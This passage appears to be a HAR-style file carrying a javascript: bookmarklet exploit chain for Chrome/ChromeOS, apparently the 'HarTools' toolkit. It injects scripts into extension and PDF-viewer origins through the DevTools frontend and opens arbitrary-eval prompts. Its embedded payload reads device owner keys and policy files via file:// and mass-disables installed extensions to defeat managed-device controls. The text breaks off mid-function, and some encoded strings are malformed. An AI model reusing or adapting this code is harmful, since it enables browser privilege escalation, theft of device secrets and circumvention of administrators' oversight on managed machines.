                        console.log(tab);
                        chrome.windows.create({ url: mojoURL, setSelfAsOpener: true }, function (info) {
                            async function createAndWriteFile() {
                                function writeFile(filename, content) {
                                    return new Promise((resolve) => {
                                        webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, function (fs) {
                                            fs.root.getFile(filename, { create: true }, function (entry) {
                                                entry.remove(function () {
                                                    fs.root.getFile(filename, { create: true }, function (entry) {
                                                        entry.createWriter(function (writer) {
                                                            writer.write(new Blob([content]))
                                                            writer.onwriteend = function () {
                                                                resolve(entry.toURL());
                                                            }
                                                        })
                                                    })
                                                })
                                            })
                                        })
                                    })

                                }
                                const htmlFile = `<html>
                                <head></head><body><iframe src="filesystem:chrome://extensions/temporary/nothing.html"></iframe>
                                </html>
                                <script>
                                onerror=  alert;
                                if (top !== window) {
                                    top.location.replace(location.href);
                                };
                                </script>
                                `
                                
                                // alert(url);
                                opener.postMessage({ url: (await writeFile('index.html', htmlFile))}, '*');
                                setTimeout(function () {
                                    close();
                                }, 800);
                            }
                            chrome.tabs.executeScript(info.tabs[0].id, { code: `(${createAndWriteFile.toString()})()` });
                            function m2(url) {
                                // alert(url);
                                onmessage = function (data) {
                                    if (data.data.type === "ack") {
                                        
                                        // chrome.tabs.getCurrent(function (tab) {
                                            // alert("navigating");
                                            top.location.replace("")
                                        // })
                                    }
                                }
                                top.postMessage({ type: 'acc' }, '*');
                            }
                            onmessage = function (dat) {
                                if (dat.data.url) {
                                    m2(dat.data.url);
                                }
                            };
                        })
                    })

                }
                dbgext(false, pdfId, xd.toString());
            }
            onmessage = function (ev) {
                if (ev.data.type === "browserInitNavigate") {
                    alert(1);
                    ev.source.location.replace(ev.data.url);
                }
            }
            document.querySelector('#updater').onclick = function (ev) {
                onunload = null;
                const ws = new WebSocket("ws://%%updaterurl%%");

                ws.onopen = function () {
                    ws.onmessage = function (ev) {
                        const received = JSON.parse(ev.data);
                        const savedURL = received.params.request.url;
                        ws.close();
                        const w = open('', '_blank');
                        console.log(savedURL);
                        w.eval(`setTimeout(function () {opener.open(atob("${btoa(savedURL)}"), '_blank'); window.close()}, 500);`);
                        setTimeout(() => { location.reload() });
                    }
                    ws.send(JSON.stringify({
                        method: "Target.setDiscoverTargets",
                        id: 999,
                        params: {}
                    }));
                }

            }
            onmessage = function (d) {
                if (d.data.type === "acc") {
                    onunload = function () { while (true); };
                    d.source.postMessage({ type: "ack" }, '*');
                    
                };

                if (!globalMap[d.data.uid]) return;

                for (const frame of globalMap) {
                    if (!frame) continue;
                    if (frame.idx === d.data.uid) {
                        frame.remove();
                        delete globalMap[globalMap.indexOf(frame)];
                        return;
                    }
                }
            }
            function dbgext(cleanup, id, payload) {
                let x = id;
                while (!x) {
                    x = prompt('Extension id?');
                    if (x === "cancel") {
                        return;
                    }
                }
                let path = '//manifest.json';
                let is_pdf = false;
                let injected = payload ?/ payload_swamp.toString();
                if (x === pdfId) {
                    path = "index.html"; // pdf viewer hack
                    is_pdf = true;
                    const b = prompt("code to execute!");
                    if (!b) return;
                    injected = injected.replace('%%CHROMEPAYLOAD%%', btoa(b));
                    InspectorFrontendHost.setInjectedScriptForOrigin('chrome://policy', b+'//');
                    
                }
                const URL_1 = `chrome-extension://${x ??
                    alert("NOTREACHED")}/${path}`;
                InspectorFrontendHost.setInjectedScriptForOrigin(new URL(URL_1).origin, `window.cleanup = ()=>{window.parent.postMessage({type: "remove", uid: window.sys.passcode}, '*');} ;onmessage = function (data) {window.sys = data.data; const w = open(origin + '/${path}'); w.onload = function () {(${injected})(w, data.data)} }//`);
                const ifr = document.createElement("iframe");
                ifr.src = URL_1;
                document.body.appendChild(ifr);
                const ifrid = globalMap.push(ifr) - 1;
                ifr.idx = ifrid;
                ifr.onload = function () {

                    ifr.contentWindow.postMessage({
                        type: "uidpass", passcode:
                            ifrid,
                        cleanup: cleanup
                    }, '*');
                    // console.log('hi');
                }
                // alert(1);

            }
            document.querySelector('#troll').onclick = function () {
                let removed = atob("// removed at the request of zeglol
console.log(1);
alert("This payload has been removed, it will not be fixed or updated again");==");
                eval(removed);
            }
            document.querySelector('#extdbg').onclick = function () {
                dbgext(false);
            }
            document.querySelectorAll('.hardcoded').forEach(el => {el.onclick = function () {
                let extid = el.getAttribute("ext");
                console.log(el.innerText, extid);
                dbgext(false, extid);
                }
            });
            document.querySelector('#cleanup').onclick = function () {
                dbgext(true);
            }
            document.querySelector('#devdbg').onclick = function () {
                var l_canceled = false;
                const id = setTimeout(function m() {
                    if (l_canceled) return;
                    (new Function(prompt("Evaluate script! (type 'cancel' to cancel)")))();
                    if (!l_canceled) setTimeout(m, 0);
                    clearTimeout(id);
                });
                Object.defineProperty(window, 'cancel', {
                    get: function () {
                        l_canceled = true;
                    }, configurable: true
                })
                return;
            }
            console.log(globalMap);
        }
        w.eval(`(${ui.toString()})()`);
        window.close();

    }

    function sleep(ms) {
        return new Promise(resolve => {
            setTimeout(resolve, ms);
        });
    }
})
)()==\"))})()//                    DOUBLE CLICK THIS",
          "httpVersion": "h3",
          "headers": [
            {
              "name": ":authority",
              "value": ""
            },
            {
              "name": ":method",
              "value": "GET"
            },
            {
              "name": ":path",
              "value": "javascript:(function(){eval(atob(\"((function () {
    if (!opener) {
        opener = window;
    }
    // alert(origin);

    //     window.w = w;
    // })
    const w = window.opener.open(window.opener.location.origin + window.opener.location.pathname);
    window.opener.close();
    w.addEventListener("load", async () => {
        if (!w.DevToolsAPI) {
            console.log("reloading");
            w.opener = null;
            w.location.reload();
        }
        await sleep(500);
        console.log("Got DevToolsAPI object from opened window:", w.DevToolsAPI);
        exploit(w);
    });

    window.w = w;


    function exploit(w) {


        function ui() {
            const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai";
            var globalUID = 0;
            let globalMap = [];
            function payload_swamp(w, d) {
                const pdfId = "mhjfbmdgcfjbbpaeojofohoefgiehjai"; // Redefinition because we convert this function to a string
                const mojoURL = "chrome://resources/mojo/mojo/public/js/bindings.js";
                console.log('hi');
                if (location.origin.includes("chrome-extension://" + pdfId)) {
                    w.close();
                    chrome.tabs.getCurrent(function (info) {
                        chrome.windows.create({
                            setSelfAsOpener: true,
                            url: mojoURL
                        }, function (win) {
                            const r = win.tabs[0].id;
                            chrome.tabs.executeScript(r, { code: `location.href = \"javascript:${atob('%%CHROMEPAYLOAD%%')}\"` });

                        })
                    })


                    return;
                }
                // console.log(d);
                // w.setTimeout(function() {
                const blob_url = new Blob(["alert(1)"], { type: "text/html" });

                w.webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, async function (fs) {
                    function removeFile(file) {
                        return new Promise(function (resolve, reject) {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(resolve);
                            })
                        });
                    }
                    function writeFile(file, data) {
                        return new Promise((resolve, reject) => {
                            fs.root.getFile(file, { create: true }, function (entry) {
                                entry.remove(function () {
                                    fs.root.getFile(file, { create: true }, function (entry) {
                                        entry.createWriter(function (writer) {
                                            writer.write(new Blob([data]));
                                            resolve(entry.toURL());
                                        })
                                    })
                                })
                            })
                        })
                    };
                    if (d.cleanup) {
                        console.log("cleaning up");
                        debugger;
                        await removeFile('index.js');
                        await removeFile('index.html');
                        alert("Cleaned up successfully!");
                        cleanup();
                        w.close();
                        return;
                    }
                    await writeFile('index.js', atob(`onerror = alert;

const uiTemplate = `

`;

if (localStorage.getItem("userdefIds") === null)
    localStorage.setItem("userdefIds", JSON.stringify([]));

Array.prototype.remove = function(item) {
    if (this.indexOf(item) === -1) throw new Error("not in array");
    this.splice(this.indexOf(item), 1);
};

function makeToast(msg, time) {
    const popover = document.createElement("article");
    popover.popover = "manual";
    popover.classList.add("toast");
    popover.classList.add("newest");
    popover.textContent = msg;
    popover.style.translate = "-50%";

    document.body.appendChild(popover);
    popover.showPopover();

    setTimeout(() => {
        popover.hidePopover();
        setTimeout(() => {
            popover.remove();
        }, 500);
    }, time * 1000);

    popover.addEventListener("toggle", (event) => {
        if (event.newState === "open") {
            moveToasts();
        }
    });
}

function moveToasts() {
    const toasts = document.querySelectorAll(".toast");

    toasts.forEach((toast) => {
        if (toast.classList.contains("newest")) {
            toast.style.top = `5px`;
            toast.classList.remove("newest");
        } else {
            const prevValue = toast.style.top.replace("px", "");
            const newValue = parseInt(prevValue) + toast.clientHeight + 10;
            toast.style.top = `${newValue}px`;
        }
    });
}

function makeDialog(title, msg, oncancel, onconfirm) {
    const dialog = document.createElement("dialog");
    const confirmBtn = document.createElement("button");
    const cancelBtn = document.createElement("button");
    const head = document.createElement("h1");
    const body = document.createElement("div");
    const foot = document.createElement("div");

    dialog.appendChild(head);
    dialog.appendChild(body);
    dialog.appendChild(foot);
    foot.appendChild(confirmBtn);
    foot.appendChild(cancelBtn);
    document.body.appendChild(dialog);

    head.textContent = title;

    body.style.overflowY = "scroll";
    body.style.color = "rgb(220 220 220)";
    body.style.fontSize = "1rem";
    body.style.borderRadius = "10px";
    body.style.padding = "10px";
    body.style.marginBottom = "10px";

    if (Array.isArray(msg)) {
        body.style.border = "solid 1px #1d1d1d";
        msg.forEach((value) => {
            let item = document.createElement("p");
            item.textContent = value;
            body.appendChild(item);
        });
    } else {
        body.style.border = "solid 1px #2d2d2d";
        body.textContent = msg;
    }

    foot.style.height = "fit-content";
    foot.style.marginTop = "auto";
    foot.style.display = "flex";
    foot.style.flexDirection = "row-reverse";

    confirmBtn.classList.add("confirmBtn");
    confirmBtn.addEventListener("click", () => {
        dialog.close();
        onconfirm();
        setTimeout(() => dialog.remove(), 1000);
    });
    confirmBtn.textContent = "Confirm";

    cancelBtn.classList.add("cancelBtn");
    cancelBtn.addEventListener("click", () => {
        dialog.close();
        oncancel();
        setTimeout(() => dialog.remove(), 1000);
    });
    cancelBtn.textContent = "Cancel";

    dialog.showModal();
}

async function extensionExists(id) {
    return new Promise((resolve) =>
        chrome.management.getAll((extensions) =>
            resolve(extensions.some((ext) => ext.id === id))
        )
    );
}

const managementTemplate = `
<title>Untitled document</title>
<link rel="icon" type="image/x-icon" href="https://raw.githubusercontent.com/crossjbly/HarTools/refs/heads/main/docs.ico">
<div id="chrome_management_disable_ext">
  <div class="header">
    <img src="https://raw.githubusercontent.com/crossjbly/HarTools/refs/heads/main/hartools.gif" alt="HarTools Logo" class="logo" />
    <h1> chrome.management Disable Extensions </h1><br>
    <hr><p> Current Extension: ${chrome.runtime.getManifest().name} (${chrome.runtime.id}), Chrome Version: R${navigator.appVersion.match(/Chrom(e|ium)\/([0-9]+)/)[2];} </p></hr>
  </div>
  <p class="description">GitHub repo: https://github.com/crossjbly/HarTools/ <br> XSS found by <a href="https://crossjbly.pages.dev/">crossjbly</a> <br> UI made by <a href="https://github.com/Blobby-Boi/">Blobby Boi</a><br></p><hr>
  <whitebuttons>
  <button id="current-extension">Disable injected extension</button>
  <button id="rmv-cmn-blt">Remove Bloat</button>
  <button id="disable-userdef-exts">Disable user defined list of extensions</button>
  </whitebuttons>
	<hr>
  <br /><br />
  <ul class="extlist">
  </ul>

  <div style="height: 50px"></div>
</div>

`;
let savedExtList = [];
const kFiles = [
    "/var/lib/devicesettings/owner.key",
    "/home/chronos/Local State"
]
async function readFile(path) {
    return (await fetch("file://" + path)).arrayBuffer();
}
async function findLastPolicyFile() {
    const kDevicePolicy = "/var/lib/devicesettings/policy.";
    let foundSomething = false;
    let i = 0;
    while (true) {
        try {
            console.log("Trying " + kDevicePolicy + i);
            await readFile(kDevicePolicy + i);
            foundSomething = true;
        } catch {
            if (foundSomething) {
                return kDevicePolicy + (i - 1);
            }
        }
        i++;
    }
}

function doesNeedFileAccess() {
    const sc = chrome.runtime.getManifest().permissions;
    return sc.includes("activeTab") || sc.includes("<all_urls>");
}

function normalizeStringPosix(path, allowAboveRoot) {
    var res = '';
    var lastSegmentLength = 0;
    var lastSlash = -1;
    var dots = 0;
    var code;
    for (var i = 0; i <= path.length; ++i) {
        if (i < path.length)
            code = path.charCodeAt(i);
        else if (code === 47)
            break;
        else
            code = 47;
        if (code === 47) {
            if (lastSlash === i - 1 || dots === 1) {

            } else if (lastSlash !== i - 1 && dots === 2) {
                if (res.length < 2 || lastSegmentLength !== 2 || res.charCodeAt(res.length - 1) !== 46 || res.charCodeAt(res.length - 2) !== 46) {
                    if (res.length > 2) {
                        var lastSlashIndex = res.lastIndexOf('/');
                        if (lastSlashIndex !== res.length - 1) {
                            if (lastSlashIndex === -1) {
                                res = '';
                                lastSegmentLength = 0;
                            } else {
                                res = res.slice(0, lastSlashIndex);
                                lastSegmentLength = res.length - 1 - res.lastIndexOf('/');
                            }
                            lastSlash = i;
                            dots = 0;
                            continue;
                        }
                    } else if (res.length === 2 || res.length === 1) {
                        res = '';
                        lastSegmentLength = 0;
                        lastSlash = i;
                        dots = 0;
                        continue;
                    }
                }
                if (allowAboveRoot) {
                    if (res.length > 0)
                        res += '/..';
                    else
                        res = '..';
                    lastSegmentLength = 2;
                }
            } else {
                if (res.length > 0)
                    res += '/' + path.slice(lastSlash + 1, i);
                else
                    res = path.slice(lastSlash + 1, i);
                lastSegmentLength = i - lastSlash - 1;
            }
            lastSlash = i;
            dots = 0;
        } else if (code === 46 && dots !== -1) {
            ++dots;
        } else {
            dots = -1;
        }
    }
    return res;
}

function _format(sep, pathObject) {
    var dir = pathObject.dir || pathObject.root;
    var base = pathObject.base || (pathObject.name || '') + (pathObject.ext || '');
    if (!dir) {
        return base;
    }
    if (dir === pathObject.root) {
        return dir + base;
    }
    return dir + sep + base;
}
var posix = {

    resolve: function resolve() {
        var resolvedPath = '';
        var resolvedAbsolute = false;
        var cwd;
        for (var i = arguments.length - 1; i >= -1 && !resolvedAbsolute; i--) {
            var path;
            if (i >= 0)
                path = arguments[i];
            else {
                if (cwd === undefined)
                    cwd = process.cwd();
                path = cwd;
            }
            assertPath(path);

            if (path.length === 0) {
                continue;
            }
            resolvedPath = path + '/' + resolvedPath;
            resolvedAbsolute = path.charCodeAt(0) === 47;
        }

        resolvedPath = normalizeStringPosix(resolvedPath, !resolvedAbsolute);
        if (resolvedAbsolute) {
            if (resolvedPath.length > 0)
                return '/' + resolvedPath;
            else
                return '/';
        } else if (resolvedPath.length > 0) {
            return resolvedPath;
        } else {
            return '.';
        }
    },
    normalize: function normalize(path) {
        assertPath(path);
        if (path.length === 0) return '.';
        var isAbsolute = path.charCodeAt(0) === 47;
        var trailingSeparator = path.charCodeAt(path.length - 1) === 47;

        path = normalizeStringPosix(path, !isAbsolute);
        if (path.length === 0 && !isAbsolute) path = '.';
        if (path.length > 0 && trailingSeparator) path += '/';
        if (isAbsolute) return '/' + path;
        return path;
    },
    isAbsolute: function isAbsolute(path) {
        assertPath(path);
        return path.length > 0 && path.charCodeAt(0) === 47;
    },
    join: function join() {
        if (arguments.length === 0)
            return '.';
        var joined;
        for (var i = 0; i < arguments.length; ++i) {
            var arg = arguments[i];
            assertPath(arg);
            if (arg.length > 0) {
                if (joined === undefined)
                    joined = arg;
                else
                    joined += '/' + arg;
            }
        }
        if (joined === undefined)
            return '.';
        return posix.normalize(joined);
    },
    relative: function relative(from, to) {
        assertPath(from);
        assertPath(to);
        if (from === to) return '';
        from = posix.resolve(from);
        to = posix.resolve(to);
        if (from === to) return '';

        var fromStart = 1;
        for (; fromStart < from.length; ++fromStart) {
            if (from.charCodeAt(fromStart) !== 47)
                break;
        }
        var fromEnd = from.length;
        var fromLen = fromEnd - fromStart;

        var toStart = 1;
        for (; toStart < to.length; ++toStart) {
            if (to.charCodeAt(toStart) !== 47)
                break;
        }
        var toEnd = to.length;
        var toLen = toEnd - toStart;

        var length = fromLen < toLen ? fromLen : toLen;
        var lastCommonSep = -1;
        var i = 0;
        for (; i <= length; ++i) {
            if (i === length) {
                if (toLen > length) {
                    if (to.charCodeAt(toStart + i) === 47) {

                        return to.slice(toStart + i + 1);
                    } else if (i === 0) {

                        return to.slice(toStart + i);
                    }
                } else if (fromLen > length) {
                    if (from.charCodeAt(fromStart + i) === 47) {

                        lastCommonSep = i;
                    } else if (i === 0) {

                        lastCommonSep = 0;
                    }
                }
                break;
            }
            var fromCode = from.charCodeAt(fromStart + i);
            var toCode = to.charCodeAt(toStart + i);
            if (fromCode !== toCode)
                break;
            else if (fromCode === 47)
                lastCommonSep = i;
        }
        var out = '';

        for (i = fromStart + lastCommonSep + 1; i <= fromEnd; ++i) {
            if (i === fromEnd || from.charCodeAt(i) === 47) {
                if (out.length === 0)
                    out += '..';
                else
                    out += '/..';
            }
        }

        if (out.length > 0)
            return out + to.slice(toStart + lastCommonSep);
        else {
            toStart += lastCommonSep;
            if (to.charCodeAt(toStart) === 47)
                ++toStart;
            return to.slice(toStart);
        }
    },
    _makeLong: function _makeLong(path) {
        return path;
    },
    dirname: function dirname(path) {
        assertPath(path);
        if (path.length === 0) return '.';
        var code = path.charCodeAt(0);
        var hasRoot = code === 47;
        var end = -1;
        var matchedSlash = true;
        for (var i = path.length - 1; i >= 1; --i) {
            code = path.charCodeAt(i);
            if (code === 47) {
                if (!matchedSlash) {
                    end = i;
                    break;
                }
            } else {

                matchedSlash = false;
            }
        }
        if (end === -1) return hasRoot ? '/' : '.';
        if (hasRoot && end === 1) return '//';
        return path.slice(0, end);
    },
    basename: function basename(path, ext) {
        if (ext !== undefined && typeof ext !== 'string') throw new TypeError('"ext" argument must be a string');

        var start = 0;
        var end = -1;
        var matchedSlash = true;
        var i;
        if (ext !== undefined && ext.length > 0 && ext.length <= path.length) {
            if (ext.length === path.length && ext === path) return '';
            var extIdx = ext.length - 1;
            var firstNonSlashEnd = -1;
            for (i = path.length - 1; i >= 0; --i) {
                var code = path.charCodeAt(i);
                if (code === 47) {

                    if (!matchedSlash) {
                        start = i + 1;
                        break;
                    }
                } else {
                    if (firstNonSlashEnd === -1) {

                        matchedSlash = false;
                        firstNonSlashEnd = i + 1;
                    }
                    if (extIdx >= 0) {

                        if (code === ext.charCodeAt(extIdx)) {
                            if (--extIdx === -1) {

                                end = i;
                            }
                        } else {

                            extIdx = -1;
                            end = firstNonSlashEnd;
                        }
                    }
                }
            }
            if (start === end) end = firstNonSlashEnd;
            else if (end === -1) end = path.length;
            return path.slice(start, end);
        } else {
            for (i = path.length - 1; i >= 0; --i) {
                if (path.charCodeAt(i) === 47) {

                    if (!matchedSlash) {
                        start = i + 1;
                        break;
                    }
                } else if (end === -1) {

                    matchedSlash = false;
                    end = i + 1;
                }
            }
            if (end === -1) return '';
            return path.slice(start, end);
        }
    },
    extname: function extname(path) {
        assertPath(path);
        var startDot = -1;
        var startPart = 0;
        var end = -1;
        var matchedSlash = true;

        var preDotState = 0;
        for (var i = path.length - 1; i >= 0; --i) {
            var code = path.charCodeAt(i);
            if (code === 47) {

                if (!matchedSlash) {
                    startPart = i + 1;
                    break;
                }
                continue;
            }
            if (end === -1) {

                matchedSlash = false;
                end = i + 1;
            }
            if (code === 46) {

                if (startDot === -1)
                    startDot = i;
                else if (preDotState !== 1)
                    preDotState = 1;
            } else if (startDot !== -1) {

                preDotState = -1;
            }
        }
        if (startDot === -1 || end === -1 ||

            preDotState === 0 ||

            preDotState === 1 && startDot === end - 1 && startDot === startPart + 1) {
            return '';
        }
        return path.slice(startDot, end);
    },
    format: function format(pathObject) {
        if (pathObject === null || typeof pathObject !== 'object') {
            throw new TypeError('The "pathObject" argument must be of type Object. Received type ' + typeof pathObject);
        }
        return _format('/', pathObject);
    },
    parse: function parse(path) {
        assertPath(path);
        var ret = {
            root: '',
            dir: '',
            base: '',
            ext: '',
            name: ''
        };
        if (path.length === 0) return ret;
        var code = path.charCodeAt(0);
        var isAbsolute = code === 47;
        var start;
        if (isAbsolute) {
            ret.root = '/';
            start = 1;
        } else {
            start = 0;
        }
        var startDot = -1;
        var startPart = 0;
        var end = -1;
        var matchedSlash = true;
        var i = path.length - 1;

        var preDotState = 0;

        for (; i >= start; --i) {
            code = path.charCodeAt(i);
            if (code === 47) {

                if (!matchedSlash) {
                    startPart = i + 1;
                    break;
                }
                continue;
            }
            if (end === -1) {

                matchedSlash = false;
                end = i + 1;
            }
            if (code === 46) {

                if (startDot === -1) startDot = i;
                else if (preDotState !== 1) preDotState = 1;
            } else if (startDot !== -1) {

                preDotState = -1;
            }
        }
        if (startDot === -1 || end === -1 ||

            preDotState === 0 ||

            preDotState === 1 && startDot === end - 1 && startDot === startPart + 1) {
            if (end !== -1) {
                if (startPart === 0 && isAbsolute) ret.base = ret.name = path.slice(1, end);
                else ret.base = ret.name = path.slice(startPart, end);
            }
        } else {
            if (startPart === 0 && isAbsolute) {
                ret.name = path.slice(1, startDot);
                ret.base = path.slice(1, end);
            } else {
                ret.name = path.slice(startPart, startDot);
                ret.base = path.slice(startPart, end);
            }
            ret.ext = path.slice(startDot, end);
        }
        if (startPart > 0) ret.dir = path.slice(0, startPart - 1);
        else if (isAbsolute) ret.dir = '/';
        return ret;
    },
    sep: '/',
    delimiter: ':',
    win32: null,
    posix: null
};
const slides = [];
let activeSlideIdx = 0;
const handleCallbacks_ = [];
const WAIT_FOR_FINISH = 1;
requestAnimationFrame(function a(t) {
    for (const cb of handleCallbacks_) {
        let m;
        if ((m = cb.f.apply(null, [t - cb.t]))) {
            if (m === 1) {
                return;
            } else {
                handleCallbacks_.splice(handleCallbacks_.indexOf(cb), 1);
            }
        }
    }
    requestAnimationFrame(a);
});
const handleInAnimationFrame = (cb, thiz = null, args = []) => {
    handleCallbacks_.push({
        f: cb,
        t: performance.now(),
    });
};

class DefaultExtensionCapabilities {
    static template = `
  <title>Untitled document</title>
  <link rel="icon" type="image/x-icon" href="https://raw.githubusercontent.com/crossjbly/HarTools-rigtools128plus/refs/heads/main/docs.ico">
  <div id="ext_default">
    <div id="default_extension_capabilities">
      <div class="header">
        <img src="https://raw.githubusercontent.com/crossjbly/HarTools-rigtools128plus/refs/heads/main/hartools.gif" alt="HarTools Logo" class="logo" />
        <h1> Default Extension Capabilities </h1>
      </div>
      <div id="tabs-buttons">
        <p>On tab update</p>
        <div id="toggleable-buttons">
		<whitebuttons>
          <button id="eruda">Eruda</button>
          <button id="chii">Chii</button>
          <button id="adblock">Adblock</button>
          <button id="edpuzzle">Edpuzzle hax</button>
          <!-- <button id="glocked">Gforms Locked Mode bypass</button> -->
		</whitebuttons>
        </div>
      </div>
      <div id="other-buttons">
        <p>Other scripts</p>
		<whitebuttons>
        <button id="swamp">Swamp</button>
        <button id="update">Update Hartools</button>
        <button id="quick-rmv-blt">Quick Remove Bloat (used w/ gforms exten)</button>
        <button id="hstfld">History Flood</button>
		</whitebuttons>
      </div>
      <h2>Evaluate code</h1>
        <div class="container">
          <textarea id="code" placeholder="Enter JavaScript to inject"></textarea>
        </div>
        <button id="code-run">Run</button>
        <div id="code-output"></div>

    </div>
    <div id="extension_tabs_default">
      <button id="tabreload">Refresh Tabs</button>
      <ul>
      </ul>
      <input id="TabURLInput"/> <button id="TabURLSubmit">Create</button>
    </div>
  </div>
  `;
    updateTabList() {
        if (this.disarmed) {
            return;
        }

        if (this.tabListInProgress) {

            return;
        }
        this.tabListInProgress = true;

        const tablist = document.body.querySelector("#extension_tabs_default ul");

        tablist.innerHTML = "";
        const thiz = this;
        chrome.windows.getAll(function(win) {
            win.forEach(function(v) {
                chrome.tabs.query({
                    windowId: v.id
                }, function(tabInfos) {
                    tabInfos.forEach(function(info) {
                        const div = document.createElement("div");
                        div.className = "tablist-item";
                        div.innerHTML = `<img ${
              chrome.tabs && (info.favIconUrl?.length ?? 0) > 0
                ? `src="${info.favIconUrl}"`
                : ""
            }/><span class="tab-name">${info.title} <litstuff> ${info.url}<litstuff></span>`;
                        if (chrome.scripting || chrome.tabs.executeScript) {
                            const runButton = document.createElement("button");
                            runButton.textContent = "Run";
                            runButton.onclick = () => runCode(true, info.id);
                            div.appendChild(runButton);
                        }

                        const previewButton = document.createElement("button");
                        previewButton.textContent = "Preview";

                        previewButton.onclick = () => {
                            thiz.disarm = true;

                            thiz.previewing = true;

                            chrome.windows.update(
                                info.windowId, {
                                    focused: true,
                                },
                                function() {
                                    chrome.tabs.update(info.id, {
                                        active: true
                                    });
                                }
                            );
                            window.currentTimeout = setTimeout(function m() {
                                clearTimeout(window.currentTimeout);

                                chrome.tabs.getCurrent(function(tab) {
                                    chrome.windows.update(
                                        tab.windowId, {
                                            focused: true,
                                        },
                                        function() {
                                            chrome.tabs.update(tab.id, {
                                                active: true
                                            });
                                            thiz.disarm = false;
                                            thiz.previewing = false;
                                        }
                                    );
                                });
                            }, 100);
                        };

                        div.appendChild(previewButton);
                        tablist.appendChild(div);
                    });
                    thiz.tabListInProgress = false;
                });
            });
        });
    }
    activate() {
        document.body.insertAdjacentHTML(
            "beforeend",
            DefaultExtensionCapabilities.template
        );

        document.body
            .querySelector("#ext_default")
            .querySelectorAll("button")
            .forEach(function(btn) {

                btn.addEventListener("click", this.onBtnClick_.bind(this, btn));
            }, this);

        this.updateTabList();
        for (let i in chrome.tabs) {
            if (i.startsWith("on")) {
                chrome.tabs[i].addListener(() => {
                    this.updateTabList();
                });
            }
        }

    }
    static getFS() {
        return new Promise(function(resolve) {
            webkitRequestFileSystem(TEMPORARY, 2 * 1024 * 1024, resolve);
        });
    }
    static async writeFile(file, data) {
        const fs = await DefaultExtensionCapabilities.getFS();
        return new Promise((resolve, reject) => {
            fs.root.getFile(file, {
                create: true
            }, function(entry) {
                entry.remove(function() {
                    fs.root.getFile(file, {
                        create: true
                    }, function(entry) {
                        entry.createWriter(function(writer) {
                            writer.write(new Blob([data]));
                            writer.onwriteend = resolve.bind(null, entry.toURL());
                        });
                    });
                });
            });
        });
    }
    static async evalCode(code) {
        const url = await DefaultExtensionCapabilities.writeFile("src.js", code);
        let script =
            document.body.querySelector("#evaluate_elem") ??
            document.createElement("script");
        script.remove();
        script = document.createElement("script");
        script.id = "evaluate_elem";
        script.src = url;
        document.body.appendChild(script);
    }

    async onBtnClick_(b) {
        switch (b.id) {
            case "code_evaluate": {
                console.log("Evaluating code!");
                const x = document.querySelector("#code_input").value;
                const fs = await DefaultExtensionCapabilities.getFS();
                DefaultExtensionCapabilities.evalCode(x);
            }
            case "tabreload": {
                this.updateTabList();
            }
        }
    }
}
class HostPermissions {
    activate() {}
}

function createExtensionCard(name, id, enabled, icon_url) {
  const li = document.createElement("li");
  li.className = "extension-card";

  const headerDiv = document.createElement("div");
  headerDiv.className = "extension-header";

  const icon = document.createElement("img");
  icon.className = "extension-icon";
  icon.src = icon_url;
  icon.alt = "Extension Icon";

  const nameDiv = document.createElement("div");
  nameDiv.className = "extension-name";
  nameDiv.textContent = name;

  headerDiv.appendChild(icon);
  headerDiv.appendChild(nameDiv);

  const idDiv = document.createElement("div");
  idDiv.className = "extension-id";
  idDiv.textContent = id;

  const switchLabel = document.createElement("label");
  switchLabel.className = "switch";

  const checkbox = document.createElement("input");
  checkbox.type = "checkbox";
  if (enabled) checkbox.checked = true;

  const sliderSpan = document.createElement("span");
  sliderSpan.className = "slider";

  switchLabel.appendChild(checkbox);
  switchLabel.appendChild(sliderSpan);

  li.appendChild(headerDiv);
  li.appendChild(idDiv);
  li.appendChild(switchLabel);

  return li;
}

function createExtensionCardAll(enabled = true) {
  const li = document.createElement("li");
  li.className = "extension-card-all";
  li.innerHTML = `
    <div class="extension-header">
      <img class="extension-icon" src="https://raw.githubusercontent.com/T3M1N4L/T3M1N4L/refs/heads/main/images/XOsX.gif" />
      <div class="extension-name">All Extensions</div>
    </div>
    <label class="switch">
      <input type="checkbox" ${enabled ? "checked" : ""}>
      <span class="slider"></span>
    </label>
  `;
  return li;
}

function updateExtensionStatus(extlist_element) {
    return new Promise(function(resolve, reject) {
        extlist_element.innerHTML = "";
        let cardAll = createExtensionCardAll();
        let cardInputAll = cardAll.querySelector("input");

        cardInputAll.addEventListener("change", (event) => {
            cardInputAll.disabled = true;
            chrome.management.getSelf(function(self) {
                chrome.management.getAll(function(extensions) {
                    if (chrome.runtime.lastError) {
                        alert(
                            "Error loading extensions: " + chrome.runtime.lastError.message
                        );
                        return reject(chrome.runtime.lastError);
                    }

                    const promises = [];
                    for (let i = 0; i < extensions.length; i++) {
                        let extId = extensions[i].id;
                        if (extId !== self.id) {
                            promises.push(
                                chrome.management.setEnabled(extId, event.target.checked)
                            );
                        }
                    }
                    Promise.all(promises)
                        .then(() => {
                            cardInputAll.disabled = false;
                            resolve();
                        })
                        .catch((error) => {
                            alert("Error enabling/disabling extensions: " + error.message);
                            reject(error);
                        });
                });
            });
        });

        extlist_element.appendChild(cardAll);

        chrome.management.getAll(function(extlist) {
            if (chrome.runtime.lastError) {
                alert("Error loading extensions: " + chrome.runtime.lastError.message);
                return reject(chrome.runtime.lastError);
            }

            const ordlist = [];
            extlist.forEach(function(extension) {
                if (extension.id === new URL(new URL(location.href).origin).host) {
                    return;
                }
                ordlist.push(extension);

                const icon =
                    extension.icons?.find((ic) => ic.size === 128) ??
                    extension.icons?.at(-1);

                let card = createExtensionCard(
                    extension.name,
                    extension.id,
                    extension.enabled,
                    icon?.url ||
                    "https://raw.githubusercontent.com/T3M1N4L/T3M1N4L/refs/heads/main/images/XOsX.gif"
                );

                let cardInput = card.querySelector("input");

                cardInput.addEventListener("change", (event) => {
                    chrome.management.setEnabled(
                        extension.id,
                        event.target.checked,
                        (result) => {
                            if (chrome.runtime.lastError) {
                                alert(
                                    "Error updating extension status: " +
                                    chrome.runtime.lastError.message
                                );
                            }
                        }
                    );
                });

                card.querySelector(".extension-icon").addEventListener("click", () => {
                    userdefIds = JSON.parse(localStorage.getItem("userdefIds"));
                    if (userdefIds.includes(extension.id)) {
                        userdefIds.remove(extension.id);
                        localStorage.setItem("userdefIds", JSON.stringify(userdefIds));
                        makeToast("removed " + extension.shortName + " from the list", 2);
                    } else {
                        userdefIds.push(extension.id);
